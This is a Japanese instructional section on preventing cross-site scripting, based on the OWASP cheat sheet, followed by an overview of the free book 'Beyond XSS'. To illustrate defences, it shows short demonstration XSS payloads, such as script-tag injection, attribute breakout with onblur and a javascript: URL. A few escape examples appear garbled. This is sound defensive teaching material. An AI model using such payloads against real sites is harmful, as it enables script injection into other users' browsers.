これらの関数・属性の名前に `dangerously` / `unsafe` / `bypass` が含まれていること自体が、「ここを使うなら自分で無害化の責任を負え」という設計上のシグナルです。

#### 2.2 目標は「完全な注入耐性（Perfect Injection Resistance）」

チートシートが理想として掲げるのは「完全な注入耐性」、すなわち**すべての変数が、出力の前に検証（validation）され、かつエスケープまたはサニタイズされている**状態です。フレームワークの自動エスケープが届かない範囲（＝上記の抜け穴を使う箇所や、フレームワークを使わない箇所）では、次章の「出力エンコーディング」と「HTMLサニタイズ」を人間が補わなければなりません。

> 出典: OWASP Cross Site Scripting Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

---

### 3. 第二の柱：出力エンコーディング（Output Encoding）― コンテキスト別ルール

ここが本セクションの中心です。前述のとおり、ブラウザは位置ごとに別のパーサで解釈するため、コンテキストごとにエンコード方式を変える必要があります。以下、チートシートが定める主要な5コンテキストを、原文のコード例とともに解説します。

以降、`$varUnsafe` は「攻撃者が制御できる可能性のある信頼できない変数」を表します。

#### 3.1 HTMLコンテキスト（HTML本文の中）

タグとタグの間に変数を置く、最も基本的なケースです。

```html
<div> $varUnsafe </div>
```

ここに何も加工せず攻撃者の入力が入ると、次のようになります。

```html
<div> <script>alert`1`</script> </div>
```

**なぜ動くのか**: `<div>` の内側はHTMLパーサが読んでいます。攻撃者が `<script>` という文字列を入れると、HTMLパーサはこれを「新しい要素の開始タグ」として解釈し、その中身をJavaScriptとして実行します。`alert`1`` はテンプレートリテラル（バッククォート）を使った呼び出しで、`alert(1)` と同義です。関数呼び出しにカッコではなくバッククォートを使うのは、`(` や `)` を除去・フィルタするような素朴な対策を回避するための定番テクニックです。

**防御**: HTMLエンティティエンコーディング（HTML Entity Encoding）。HTMLパーサにとって特別な意味を持つ文字を、エンティティ（`&名前;` や `&#番号;` の形式の“文字の別表現”）に変換します。チートシートが挙げる変換対象は次のとおりです。

```
&  →  &amp;
<  →  &lt;
>  →  &gt;
"  →  &quot;
'  →  &#x27;
```

これにより攻撃者の `<script>` は `&lt;script&gt;` となり、HTMLパーサは「小なり記号という“文字データ”」として画面に表示するだけで、タグとしては解釈しません。

**JavaScriptで安全に行う方法（Safe Sink）**:

```javascript
elem.textContent = dangerVariable;  // 安全
```

`textContent` は、代入された文字列を常に「テキスト（データ）」として扱い、HTMLとして解釈しません。ブラウザがエンコードを肩代わりしてくれるため、開発者が手でエンティティ変換する必要がありません。これが「安全なシンク（Safe Sink）」の典型例です（シンクについては第5章で詳述）。

#### 3.2 HTML属性コンテキスト（属性値の中）

変数を属性値として置くケースです。

```html
<div attr="$varUnsafe">
```

無防備だと、次のように属性の境界を破られます。

```html
<div attr="x" onblur="alert(1)">
```

**なぜ動くのか**: 攻撃者が入力に `"` を含めると、属性値を囲むダブルクォートが早期に閉じられ、そこから先が「新しい属性」としてHTMLパーサに解釈されます。攻撃者は続けて `onblur="alert(1)"` のようなイベントハンドラ属性（要素がフォーカスを失ったときにJavaScriptを実行する属性）を注入できます。属性の“区切り”である `"` が、防御の要になっていることがわかります。

**防御その1：属性値を必ずクォートで囲む**。チートシートは、なぜクォートが決定的に重要かを次のように説明します。

> 「変数を囲むのに `"` や `'` のような引用符を使うことが極めて重要である。クォーティングは変数が動作するコンテキストを変更することを困難にし、XSS防止に役立つ。またクォーティングは、エンコードすべき文字集合を大幅に減らす（Quoting also significantly reduces the characterset that you need to encode）。」

もしクォートで囲まないと（例: `<div attr=$varUnsafe>`）、攻撃者は `"` を注入する必要すらなく、単なる**スペース1文字**で属性を区切って新しいイベントハンドラを追加できてしまいます。クォートで囲むことで「攻撃者はまずそのクォート文字を注入しないと境界を破れない」状態になり、無害化すべき文字が実質的にそのクォート文字（と `&`）に絞り込まれます。

**防御その2：HTML属性エンコーディング**。チートシートは、属性コンテキストでは非常に強いエンコード（aggressive encoding）を推奨します。すなわち「英数字（アルファベットと数字）を除くすべての文字を `&#xHH;` 形式（HHはその文字のUnicodeコードポイントを16進で表したもの）でエンコードする」というものです。

```
例:  A  →  &#x41;
```

英数字だけを素通しにして、記号類をすべてエンティティ化することで、攻撃者がどんな区切り文字（`"`, `'`, スペース, `>` など）を送り込んでも、それらは無害な文字データに変換されます。

**安全なHTML属性の一覧（Safe HTML Attributes）**: チートシートは、上記のエンコードを施したうえで、変数を入れてよい「安全な属性」を明示的に列挙しています。逆に言えば、この一覧に**ない**属性（とりわけ `onclick` などの `on*` イベントハンドラ、`href`/`src` などのURL属性、`style` 属性）に変数を入れるのは、属性エンコードだけでは不十分で危険です。

```
align, alink, alt, bgcolor, border, cellpadding, cellspacing, class,
color, cols, colspan, coords, dir, face, height, hspace, ismap, lang,
marginheight, marginwidth, multiple, nohref, noresize, noshade, nowrap,
ref, rel, rev, rows, rowspan, scrolling, shape, span, summary, tabindex,
title, usemap, valign, value, vlink, vspace, width
```

**JavaScriptで安全に行う方法（Safe Sink）**:

```javascript
elem.setAttribute(safeName, dangerVariable);  // 安全（safeNameが安全な属性名であること）
elem[attribute] = dangerVariable;             // 安全
```

`setAttribute` は値をデータとして設定するため、DOM経由で属性を設定する限りは属性値インジェクションが起きません。ただし属性名（`safeName`）自体が攻撃者制御でないことが前提です（属性名に `onerror` などを指定できてしまえば意味がありません）。

#### 3.3 JavaScriptコンテキスト（インラインJavaScriptの中）

`<script>` 内やイベントハンドラ内など、JavaScriptとして解釈される場所に変数を置くケースです。チートシートはここで非常に厳しい制限を課します。

> 「JavaScript内で変数を置いてよい“唯一の安全な位置”は、“クォートで囲まれたデータ値（quoted data value）”の内部だけである。それ以外のコンテキストはすべて安全ではない（All other contexts are unsafe）。」

安全とされるのは、次のように文字列リテラルの中に置く形だけです。

```html
<script>alert('$varUnsafe')</script>
<script>x='$varUnsafe'</script>
<div onmouseover="'$varUnsafe'"></div>
```

**なぜ“クォートで囲まれたデータ値”だけが安全なのか**: JavaScriptパーサから見ると、`'...'` の中は「文字列リテラル（データ）」として扱われ、コードとしては実行されません。したがって攻撃者の狙いは「この文字列リテラルを途中で閉じて、そこからコードを書き始める」ことに絞られます。たとえば `$varUnsafe` に `';alert(1);//` が入れば、`x='';alert(1);//'` となり、文字列を閉じた後の `alert(1)` が実行されてしまいます。逆に言えば、文字列を閉じさせる文字さえ無害化すれば守れる、という見通しの良い状況になります。だからこそ「クォートで囲まれたデータ値」以外（＝スクリプト直下に裸で置く、イベントハンドラの式部分に置く、など）は、閉じるべき境界が存在しないため、そもそも安全化のしようがなく「unsafe」と断じられるのです。

**防御：JavaScriptエンコーディング**。英数字以外のすべての文字を16進エスケープします。ここでチートシート原文には**表記のゆれ**があり、本文の解説箇所では `\xHH` 形式（例: `\x27`）、末尾の「Output Encoding Rules Summary（出力エンコーディングルール要約）」表では Unicode の `\uXXXX` 形式（例: `'`）が示されています。実務上はどちらも「JavaScriptの文字列リテラル内で、その文字を安全なエスケープ表現に置き換える」ことを意味し、`\uXXXX` 形式のほうがコードポイントを6桁で明示できるため曖昧さが少なく堅牢です。

**バックスラッシュエスケープを使ってはいけない**。チートシートは明確に警告します。

> 「バックスラッシュによるエスケープ（`\"` や `\'` や `\\`）は避けよ（avoid backslash encoding）。」

**なぜバックスラッシュエスケープが危険なのか**: `"` を `\"` に変換するだけの素朴な対策は、攻撃者がまず `\` を送り込むことで破れます。たとえば入力を `\` にすると、防御側は `\` を `\\`… ではなく、`"` だけをエスケープする実装だと、攻撃者の `\` はそのまま残り、直後に防御側が付けた `\"` と結合して `\\"` となり、結局クォートが「エスケープされていない状態」で復活してしまう、といった取りこぼしが起きます。区切り文字だけをバックスラッシュで守るのではなく、上記の16進エスケープで“文字集合ごと”無害化するのが確実だ、というのがチートシートの立場です。

**JSONを扱う場合の注意**: サーバがJSONを返すなら、レスポンスの `Content-Type` を必ず `application/json` にすること（`text/html` にしない）。`text/html` のままだと、ブラウザがJSON応答をHTMLとして解釈し、中に含まれる `<script>` などが実行されてしまう危険があるためです。また、JSON文字列をJavaScriptに埋め込む際は、HTMLの区切り文字（`<`, `>`, `&` など）もエスケープしておくと、`</script>` によるスクリプトブロックの早期終了を防げます。

#### 3.4 CSSコンテキスト（インラインCSSの中）

`<style>` 内や `style` 属性内の**プロパティ値**に変数を置くケースです。

```html
<style> selector { property : $varUnsafe; } </style>
<span style="property : $varUnsafe">Oh no</span>
```

**防御：CSS Hexエンコーディング（CSS 16進エンコード）**。CSSパーサ用の16進エスケープには短形式 `\XX` と長形式 `\XXXXXX`（6桁ゼロ埋め）があります。

```
例:  A  →  \41   または   \000041
```

**なぜ長形式（ゼロ埋め6桁）が推奨されるのか**: これはCSSパーサの16進エスケープの構文規則に起因します。CSSでは、16進エスケープは「1〜6桁の16進数字」を取り、次のように終端が判定されます — (a) 6桁に達したら終了、または (b) 6桁未満でも直後に空白文字が来たら終了。したがって短形式 `\41` の直後にたまたま `2`（16進数字とみなせる文字）が続くと、パーサは `\412` を1つのエスケープとして読み、意図した文字とずれてしまいます。チートシートはこの曖昧さを避けるため、次の2択を挙げます。

> (a) CSSエンコードの後にスペースを1つ足す（このスペースはCSSパーサに無視される）／ (b) 値をゼロ埋めして6桁の完全形式で書く。

長形式なら「必ず6桁で確定」するため、後続文字に左右されず一意に解釈されます。これが推奨される理由です。

**JavaScriptで安全に行う方法（Safe Sink）**:

```javascript
style.property = x;  // 安全（プロパティ値へのDOM経由の代入は自動でCSSエンコードされる）
```

**CSSコンテキストの危険な使い方**: プロパティ**値**なら上記で守れますが、次は守れません。

- セレクタ部分に変数を入れる
- URLを扱うプロパティに変数を入れる。チートシートは具体例として次を挙げます。

```css
{ background-url : "javascript:alert(xss)"; }
```

**なぜ動くのか**: 一部のプロパティ（背景画像URLなど）は値としてURLを取り、そのURLスキームが `javascript:` の場合、URLパーサ経由でスクリプトが実行され得ます。CSS 16進エンコードは「文字」を無害化しますが、「`javascript:` というスキームを許してしまう」設計上の穴には対処できません。したがってURLを含むプロパティは、CSSエンコードとは別に、スキームの検証（`http`/`https` のみ許可等）が必要です。

#### 3.5 URLコンテキスト（URLパラメータの中）

リンクのクエリパラメータなどに変数を置くケースです。

```html
<a href="http://www.owasp.org?test=$varUnsafe">link</a>
```

**防御：URLエンコーディング（パーセントエンコーディング）**。W3C標準のパーセントエンコード（`%HH` 形式）で、**パラメータ“値”だけ**をエンコードします。URL全体をまとめてエンコードしてはいけません（`http://` の `:` や `/` までエンコードするとURLが壊れます）。

**JavaScriptで安全に行う方法（Safe Sink）**:

```javascript
window.encodeURIComponent(x);  // 安全（パラメータ値のエンコードに使う）
```

`encodeURIComponent` は「URLの1コンポーネント（値1個分）」用のエンコード関数で、`&` や `=`、`?` など区切り文字も含めてエスケープするため、値の中に区切り文字を注入されてパラメータ構造を改変される攻撃を防げます。

**重要な落とし穴：URL属性内のURLは“二重エンコード”が必要**。URLをHTML属性の値として出力する場合、パーサが2段階（まずHTML属性パーサ、次にURLパーサ）で解釈するため、エンコードも2段階必要です。チートシートの例：

```
url = "https://site.com?data=" + urlencode(parameter)
<a href='attributeEncode(url)'>link</a>
```

**なぜ順序が重要か**: 最初に `urlencode()`（URLエンコード）でパラメータ値のURL区切り文字を無害化し、次にその出来上がったURL文字列全体を `attributeEncode()`（HTML属性エンコード）でHTML属性の区切り文字（`"` など）に対して無害化します。この「内側のパーサ用エンコード → 外側のパーサ用エンコード」という順序は、1.1で述べた「ブラウザが外側から内側へパーサを切り替えて解釈する」構造の裏返しであり、複合コンテキスト一般に通用する原則です。

さらにURL属性（`href`/`src`）では、値そのものが `javascript:` のような危険スキームでないことの検証も必須です（エンコードだけでは `javascript:alert(1)` を止められないため。詳細は3.4と同じ理屈です）。

#### 3.6 出力エンコーディングルール要約表

チートシートの要約を、教科書用に再構成した対応表です。

| データ種別 | コンテキスト | コード例 | 採るべき防御 |
|---|---|---|---|
| 文字列 | HTML本文 | `<span>信頼できないデータ</span>` | HTMLエンティティエンコード |
| 文字列 | 安全なHTML属性 | `<input value="信頼できないデータ">` | 強いHTML属性エンコード + 安全属性リストに限定 + 厳密な入力検証 |
| 文字列 | GETパラメータ | `<a href="/search?q=信頼できないデータ">` | URL（パーセント）エンコード |
| 文字列 | `href`/`src` のURL | `<a href="信頼できないURL">` | 入力の正規化・URL検証・スキームのホワイトリスト（`http`/`https`）+ 属性エンコード |
| 文字列 | CSSプロパティ値 | `<div style="width: 信頼できないデータ;">` | 厳密な構造検証 + CSS 16進エンコード |
| 文字列 | JavaScript変数 | `<script>var x='信頼できないデータ';</script>` | 変数はクォートで囲む + JS 16進/Unicodeエンコード + バックスラッシュエスケープは使わない |
| HTML | HTML本文 | `<div>信頼できないHTML</div>` | HTMLサニタイズ（後述。DOMPurify等） |
| 文字列 | DOM XSS | `<script>document.write(document.location.hash)</script>` | 「DOM based XSS Prevention Cheat Sheet」を参照 |

各エンコード方式の対象と形式のまとめ：

| エンコード方式 | 何をどう変換するか |
|---|---|
| HTMLエンティティ | `&`→`&amp;` / `<`→`&lt;` / `>`→`&gt;` / `"`→`&quot;` / `'`→`&#x27;` |
| HTML属性 | 英数字以外を `&#xHH;`（16進Unicode）に。例: `A`→`&#x41;` |
| JavaScript | 英数字以外を `\xHH` もしくは `\uXXXX` に。例: `A`→`A` |
| CSS Hex | `\XX`（短）または `\XXXXXX`（長・ゼロ埋め6桁）。例: `A`→`\41` / `\000041` |
| URL | W3C標準パーセントエンコード `%HH`。値部分のみ |

> 出典: OWASP Cross Site Scripting Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

---

### 4. 危険なコンテキスト（Dangerous Contexts）― エンコードでは守れない場所

チートシートは、「そもそも変数を置いてはいけない場所」を明示します。これらの位置は、出力エンコードを施しても安全にならないため、設計として変数の挿入を避けるべきです。

```html
<script>ここに直接（Directly in a script）</script>
<!-- HTMLコメントの中（Inside an HTML comment） -->
<style>ここに直接（Directly in CSS）</style>
<div ここに属性名を定義=test />
<ここにタグ名を定義 href="/test" />
```

**なぜエンコードでは守れないのか**: これらは「区切りで囲まれたデータ値」ではなく、構文構造そのものを変数が担ってしまう位置だからです。たとえばタグ名や属性名を変数で作ると、閉じるべき境界が存在せず、どんなエンコードをしても攻撃者は新しい構文要素を作れてしまいます。HTMLコメント内も、`-->` によるコメント終了や、ブラウザによってはコメント内スクリプトの扱いが不安定で、安全性を保証できません。

そのほか、チートシートが危険領域として挙げるもの：

- コールバック関数（callback functions）
- CSS内でのURL処理: `{ background-url : "javascript:alert(xss)"; }`
- JavaScriptのイベントハンドラ全般: `onclick()`, `onerror()`, `onmouseover()` など
- 危険なJavaScript関数: `eval()`, `setInterval()`, `setTimeout()`（いずれも文字列をコードとして評価しうる）

これらの関数は「文字列を受け取ってコードとして実行する」性質を持つため、渡された文字列がどれだけエンコードされていても、実行時にコードとして解釈されればXSSになります。原則は「これらのシンクに信頼できないデータを渡さない」ことです。

> 出典: OWASP Cross Site Scripting Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

---

### 5. 安全なシンク（Safe Sinks）と「ソース／シンク」モデル

XSSを構造的に理解する枠組みとして、チートシートは「ソース（source）／シンク（sink）」モデルを用います。

- **ソース（source）**: 信頼できないデータが入ってくる入口（URL、フォーム入力、`location.hash`、外部APIの応答など）。
- **シンク（sink）**: そのデータが最終的に代入・解釈される危険な出力先（`innerHTML`、`document.write`、`eval` など）。

XSSは「汚染されたソースのデータが、無害化されないままシンクに到達する」ときに起こります。ここで重要なのが「安全なシンク（Safe Sink）」という概念です。

> 「シンクの中には、変数を“テキスト”として扱い実行しないものがある。それが安全なシンクである。」

安全なシンクは、代入された値を常にデータとして扱うため、そこへ書き込む限りXSSが発生しません。チートシートが挙げる代表例：

```javascript
elem.textContent = dangerVariable;
elem.insertAdjacentText(dangerVariable);
elem.className = dangerVariable;
elem.setAttribute(safeName, dangerVariable);
formfield.value = dangerVariable;
document.createTextNode(dangerVariable);
document.createElement(dangerVariable);
elem.innerHTML = DOMPurify.sanitize(dangerVar);  // ※サニタイズと併用して初めて安全
```

逆に、次は**安全でないシンク**であり、信頼できないデータを直接渡してはいけません。

- `innerHTML`（`DOMPurify.sanitize()` 併用時を除く）
- `outerHTML`
- `document.write()`
- `script.src`
- 各種の評価関数（`eval` 等）

実務のコツは、「どうしてもHTMLとして挿入する必要がないなら、`innerHTML` ではなく `textContent` を使う」ことです。安全なシンクを選ぶだけで、手動エンコードすら不要になり、ミスの余地が消えます。

> 出典: OWASP Cross Site Scripting Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

---

### 6. 第三の柱：HTMLサニタイズ（HTML Sanitization）

出力エンコードは「HTMLをすべて無害な文字に変える」ため、ユーザーに**リッチテキスト（太字・箇条書きなど、HTML自体を含む入力）**を許したい場面では使えません。エンコードすると、ユーザーが書いた `<b>` までもが `&lt;b&gt;` になって画面に文字として出てしまい、意図した装飾が壊れるからです。WYSIWYGエディタ（見たままを編集できるリッチテキストエディタ）のように「HTMLを保持しつつ、危険な部分だけ除去したい」場合に必要なのが、HTMLサニタイズです。

サニタイズ（sanitize: 入力に含まれる危険な要素・属性・スキームを除去または無害化し、安全なHTMLだけを残す処理）は、`<b>` や `<a>` のような無害なタグは残し、`<script>` や `onerror=` や `javascript:` のような危険な構造だけを取り除きます。

**OWASP推奨のライブラリ：DOMPurify**。

```javascript
let clean = DOMPurify.sanitize(dirty);
```

チートシートが挙げる運用上の注意点：

1. **サニタイズ後に結果の文字列を加工しない**。サニタイズ済みHTMLに後から文字列操作を加えると、安全性が崩れる（無害化した構造を再び壊してしまう）可能性がある。
2. **サニタイズ後に別のライブラリへ渡さない**。渡した先のライブラリが文字列を変形し、危険な構造を復活させることがある。サニタイズは「DOMに挿入する直前」に行う。
3. **サニタイズライブラリは定期的にパッチを適用する（keep it patched）**。これはブラウザの挙動が更新され、新しいバイパス手法（サニタイザをすり抜ける新技法）が継続的に発見されるためです。

3点目は特に重要で、サニタイザのバージョン依存性を意識する必要があります。歴史的に、DOMPurify には既知の回避（mutation XSS: ブラウザがHTMLを再パースする際に構造が“変異”して、サニタイズ後に危険なタグが復活する攻撃）に対する修正が複数リリースされてきました。たとえば DOMPurify 2.0.17（2020年公開）や、それ以前の各バージョンでは、当時知られたバイパスへの修正が順次取り込まれています。要点は「サニタイザは一度入れれば終わりではなく、常に最新版へ更新し続ける前提の防御である」ということです。（バージョンごとの具体的な脆弱性・修正状況は、DOMPurifyのリリースノートおよびCHANGELOGで確認するのが確実です。）

> 出典: OWASP Cross Site Scripting Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

---

### 7. 多層防御（Defense-in-Depth）の各層

以上の3本柱が「主防御」ですが、チートシートはそれを補強する追加の防御層も挙げます。いずれも「主防御の代わりにはならない」点が繰り返し強調されます。

#### 7.1 Cookie属性（HttpOnly など）

Cookieに `HttpOnly` 属性を付けると、そのCookieはJavaScriptの `document.cookie` から読めなくなります。これによりXSSが成立してもセッションCookieの窃取を防ぎ、被害を軽減できます。ただしチートシートは、これはあくまで「影響の軽減（limit the impact）」であって、XSSそのものを防ぐわけではないと明記しています。

#### 7.2 Content Security Policy（CSP）

CSP（Content Security Policy: ブラウザに対し「どこから読み込んだスクリプトなら実行してよいか」等をHTTPヘッダで指示する仕組み）は、許可リスト（allowlist）方式で、許可していないソースのスクリプト実行やインラインスクリプトの実行をブラウザにブロックさせます。

チートシートの立場は明確です。

> 「CSPは多層防御（defense-in-depth）の追加層であり、主防御メカニズムではない。実装を誤りやすい（easy to get wrong）。」

つまり「CSPを入れたから出力エンコードは不要」という考えは誤りで、CSPは「万一エンコードを漏らしたときの保険」として位置づけるべきものです。詳細は別資料「Content Security Policy Cheat Sheet」に委ねられています。

#### 7.3 Trusted Types

Trusted Types は、Chromium系ブラウザで利用できる、DOM系XSSを構造的に封じる比較的新しい仕組みです。次のCSPヘッダで有効化します。

```
Content-Security-Policy: require-trusted-types-for 'script'
```

これを有効にすると、`innerHTML` / `outerHTML` / `document.write` / `script.src` といったDOM XSSシンクが、**素の文字列（plain string）を受け付けなくなり**、必ず「検証済みポリシーを通した型付きの値（Trusted Type）」経由でしか代入できなくなります。チートシートはこれを「DOM系XSSのクラス全体（an entire class）を排除しうる数少ない制御の一つ」と高く評価しています。

**なぜ強力なのか**: これまでの防御は「開発者が正しくエンコード／サニタイズすること」に依存していました。Trusted Types は、危険なシンクへの代入を言語レベル（ブラウザのランタイム）で強制的にゲートするため、「うっかり生文字列を `innerHTML` に渡す」ミス自体が実行時エラーになり、そもそも起こせなくなります。

#### 7.4 WAF（Web Application Firewall）― 推奨されない

WAF（Web Application Firewall: 既知の攻撃パターンに合致するリクエストを検出・遮断する仕組み）でXSSペイロードをブロックする方法もありますが、チートシートはこれを主防御として**推奨しません**。理由：

- 信頼性が低い（既知パターンのマッチに頼るため）
- 新しいバイパス手法が継続的に発見される
- 根本原因（無害化されていないデータがコードとして解釈されること）に対処していない
- **DOMベースXSSを見落とす**（DOM系XSSはサーバのレスポンスに攻撃文字列が現れず、ブラウザ内で完結するため、サーバ前段のWAFでは検知できない）

> 出典: OWASP Cross Site Scripting Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

---

### 8. アンチパターン（やってはいけない防御設計）

チートシートは、実務でありがちな「一見よさそうだが破綻する」防御設計を、理由とともに列挙しています。中〜上級者ほど陥りやすい罠なので、原理とともに押さえておきましょう。

#### 8.1 CSPだけに依存する

**問題1：ブラウザ互換性の前提が崩れる**。全ブラウザがCSP Level 2/3に対応していると仮定すると、レガシーブラウザで防御が効かない。

**問題2：レガシーアプリを壊す**。組織全体に一律のCSPを適用すると既存アプリが動かなくなり、結局あちこちに「例外・除外」を作る羽目になる。その例外が防御の“ひび（cracks）”になる。

要するにCSPは「主防御」にはできず、あくまで補助である、という8.2節と同じ結論です。

#### 8.2 HTTPインターセプタ（一元的なフィルタ）に依存する

サーブレットフィルタや Spring のインターセプタ（`org.springframework.web.servlet.HandlerInterceptor` など。全リクエスト／レスポンスを横断的に処理する仕組み）で、入力／出力をまとめて検証・エンコードしようとする設計です。一見すると「一箇所で全部守れて効率的」に見えますが、チートシートは次の致命的問題を指摘します。

**問題1：コンテキストを認識できず、不適切なエンコードになる**。これは第1章で述べた原理の直接の帰結です。同じ `lastname` という値が、あるページではHTMLコンテキスト、別のページではJavaScriptコンテキストで使われることがある。インターセプタは「その値が最終的にどのコンテキストで使われるか」を知らないため、単一のエンコード方式しか適用できず、両方には正しく対応できません。

**問題2：二重エンコードと表示崩れ**。コンテキストを無視して一律エンコードすると、`O'Hara` が `O&#39;Hara` のように壊れて表示される（さらに別の場所でもう一度エンコードされると二重エンコードになる）。これを嫌ってビジネス要件で例外を作ると、その例外がXSS防御の穴になります。

**問題3：DOMベースXSSに無効**。レスポンス中の全JavaScriptを走査して汚染データを検出するのは非現実的であり、DOM系XSS（サーバのレスポンス文字列には現れず、ブラウザ内でソース→シンクが完結する型）はインターセプタでは捕捉できません。

**問題4：外部ソース由来のデータに対応できない**。インターセプタは通常「HTTPの入力パラメータ」だけを“汚染”とみなします。しかし実際には、内部のREST API応答や社内データベースの値も汚染されている可能性があります。チートシートの具体例：あるアプリが顧客の住所欄にXSSペイロードを保存し、別のアプリ（顧客請求画面）がそのDBの住所を「信頼できる内部データ」とみなして無害化せず表示すると、カスタマーサポート担当者がその画面を開いた瞬間にスクリプトが発火する――というストアド／二次注入型の被害です。インターセプタは「入力パラメータだけ」を汚染源と決めつけるため、この経路を守れません。

**総括**: これらのアンチパターンの根っこは、いずれも「コンテキストという情報を無視して防御を一箇所に集約しようとした」ことにあります。第1章の原理――防御は“そのデータが最終的にどのパーサに解釈されるか”に合わせて行う――を守れない設計は、規模が大きくなるほど破綻するのです。

> 出典: OWASP Cross Site Scripting Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

---

### 9. このセクションのまとめ

- XSSの本質は「本来データであるべき文字列が、ブラウザによってコードとして解釈・実行されてしまう」こと。防御の核心は、**そのデータが最終的にどのパーサ（HTML／属性／JavaScript／CSS／URL）に解釈されるかに合わせて無害化する**「コンテキスト別出力エンコーディング」である。
- 「HTMLエンコードさえすれば安全」は誤り。`<script>`・イベントハンドラ・CSS・URLの中ではHTMLエンティティエンコードは効かない。
- 防御は3本柱の組み合わせ：**フレームワークの自動エスケープを正しく使い（抜け穴 `dangerouslySetInnerHTML` 等に注意）**、その外側は**コンテキスト別に出力エンコードし**、HTML自体を許す箇所は**DOMPurifyでサニタイズ（かつ更新し続ける）**。
- 迷ったら「安全なシンク（`textContent`, `setAttribute`, `encodeURIComponent` 等）」を選ぶ。安全なシンクなら手動エンコードすら要らず、ミスの余地が消える。
- CSP・HttpOnly・Trusted Types は多層防御の追加層。とくに Trusted Types はDOM系XSSをクラスごと封じうる強力な制御。ただしCSP単独依存やWAF依存、コンテキスト非依存のインターセプタ一括処理は、原理的に破綻するアンチパターンである。

> 出典: OWASP Cross Site Scripting Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
>
> 関連資料（本チートシートが参照するもの）: DOM based XSS Prevention Cheat Sheet / Content Security Policy Cheat Sheet / XSS Filter Evasion Cheat Sheet

---

## Beyond XSS 概説（無料オンライン書籍の全体像）

このセクションでは、本教科書がこれから何度も参照することになる無料オンライン書籍 **『Beyond XSS: Explore the Web Front-end Security Universe（Beyond XSS：Webフロントエンドセキュリティの宇宙を探る）』**（著者: Huli／aszx87410）の全体像を示す。反射型（reflected：攻撃者の入力がサーバーの応答にそのまま「反射」されて即座に実行されるタイプ）の素朴なXSSしか知らない読者が、これから学ぶ「XSSの先にある広大な領域」の地図を最初に手に入れることが目的である。個々のトピックの深掘りは本教科書の後続セクションおよび原著の各章で行うため、ここでは **「何が・どこにあり・なぜ危険なのか」** を俯瞰できるようにする。

> 補足（取得方法の透明性）: 担当URL `https://aszx87410.github.io/beyond-xss/ja/` および `https://aszx87410.github.io/beyond-xss/en/` は、本作業環境のネットワーク・エグレス（外向き通信）ポリシーにより `aszx87410.github.io` ホストへの直接アクセスがブロックされていた。そのため、**両ページの一次ソースそのものである公式GitHubリポジトリ `github.com/aszx87410/beyond-xss`**（Docusaurusで生成された当該サイトの元Markdown）を取得し、日本語版トップページ（`i18n/ja/.../introduction.md`）・英語版トップページ（`i18n/en/.../introduction.md`）・全章の目次・各記事タイトル・まとめページを精読して内容を復元した。したがって「実質的な内容」は完全に取得できているため、本セクションでは取得不可資料としては扱っていない。引用元URLは公開サイト側のURLで示す。

---

### Beyond XSS とは何か —「フロントエンドセキュリティの宇宙」というメタファー

Beyond XSS は、台湾出身のフロントエンドエンジニア兼セキュリティ愛好家 **Huli** による、**Webフロントエンドセキュリティを体系的に扱う無料の連載記事シリーズ／オンライン書籍**である。書籍版（繁体字中国語）は深智數位から2024年7月に商業出版されたが、同内容が **繁体字中国語・英語・日本語の3言語**でオンライン無料公開されている。

本書を貫く中心的なメタファーは「**フロントエンドセキュリティ＝宇宙**」である。著者はこう述べる。

> フロントエンドセキュリティの分野を宇宙に例えるなら、XSSは多くの人の注目を集める最も大きく明るい惑星かもしれない。しかしXSS以外にも、あなたが気づいていないだけで、いつもそこにある小さな惑星や星がたくさんある。

つまり本書の狙いは、**「フロントエンドセキュリティ＝XSSだけ」という誤った認識を解体すること**にある。多くのソフトウェアエンジニアはOWASP Top 10（Webアプリの代表的な脆弱性トップ10をまとめた業界標準リスト）をぼんやり知っていても、こと「フロントエンド領域の攻撃」に話を絞るとXSS以外をほとんど知らない、という問題意識が出発点になっている。

著者自身の実感として印象的なのが次の一節である。フロントエンドエンジニアとして5〜6年働き、HTML/CSS/JavaScriptの使い方の8割は見てきたつもりだったのに——

> セキュリティの世界に飛び込んでみると、逆に80%くらいはまったく初めて見るものだった。

見慣れたHTML・CSS・JavaScriptが、開発では絶対にしない「見たこともない使われ方」をされる。この驚き（「すごい、どうして今までこれを知らなかったんだろう？」）を読者にも体験してもらうことが、本書の情緒的なゴールでもある。

> 出典: このシリーズについて（About This Series） — https://aszx87410.github.io/beyond-xss/ja/ ／ https://aszx87410.github.io/beyond-xss/en/

### 本書の成り立ち・言語・入手方法

- **原点**: 台湾のオンラインイベント **「2023 iThome 鐵人賽（iT Ironman Contest）」**（30日間連続で記事を投稿するコンテスト）に投稿した連載が母体。コンテスト終了後に内容を加筆修正し、静的サイトジェネレータ **Docusaurus 2** でサイト化した。
- **執筆言語と翻訳**: 全記事は著者の母語である**繁体字中国語で執筆**され、その後 **ChatGPTで翻訳し、著者が手作業で修正**して英語版・日本語版を用意している。機械翻訳ベースゆえ、日本語版・英語版には訳のぶれや細かな誤りが残りうる点は著者自身が明言している（技術的に厳密な確認が必要な箇所は原文＝繁体字版に当たるのが安全）。
- **構成規模**: 序章・まとめ・連絡先を除き、**本編は5章・全32本の記事**（連載時は「30本」の目標で始まり、加筆で増えている）。
- **入手**: 完全無料でオンライン公開（日本語版トップ `https://aszx87410.github.io/beyond-xss/ja/`、英語版 `.../en/`、繁体字版 `.../`）。ソースと議論は GitHub（`github.com/aszx87410/beyond-xss`、Discussionsで質問・議論可）。
